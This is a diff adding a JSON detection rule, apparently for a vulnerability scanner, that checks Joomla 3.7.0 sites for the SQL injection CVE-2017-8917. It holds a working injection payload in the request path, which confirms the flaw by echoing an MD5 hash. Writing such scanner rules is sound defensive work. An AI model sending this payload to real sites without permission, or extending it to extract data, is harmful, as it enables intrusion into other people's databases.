@@ -1,0 +1,23 @@
+{
+  "cms": "joomla",
+  "version": "",
+  "author": "wolf",
+  "desc": "Joomla 3.7.0 存在SQL注入漏洞",
+  "tags": [
+    "SQL注入"
+  ],
+  "refer": [
+    "https://paper.seebug.org/305/",
+    "CVE-2017-8917"
+  ],
+  "request": {
+    "path": "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,md5(700)),1)",
+    "method": "POST",
+    "parameter": ""
+  },
+  "response": {
+    "position": "body",
+    "regex": false,
+    "match": "e5841df2166dd424"
+  }
+}
